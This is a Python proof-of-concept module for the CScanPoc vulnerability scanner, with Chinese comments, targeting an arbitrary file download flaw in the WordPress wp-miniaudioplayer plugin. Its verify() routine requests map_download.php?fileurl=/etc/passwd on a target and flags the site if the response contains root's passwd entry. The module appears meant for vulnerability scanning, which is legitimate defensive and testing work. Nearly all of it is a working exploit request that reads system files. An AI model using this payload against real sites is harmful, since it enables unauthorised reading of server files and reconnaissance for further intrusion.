# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0041' # 平台漏洞编号，留空
    name = 'WordPress wp-miniaudioplayer 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        WordPress wp-miniaudioplayer /wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl= 任意文件下载。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'wp-miniaudioplayer'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '9e4ee61a-ec9c-45bf-a1b7-fbf53b3ea141'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd'
            verify_url = self.target + payload
            r = requests.get(verify_url)
            
            if r.status_code == 200 and '/root:/bin/bash' in r.content:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
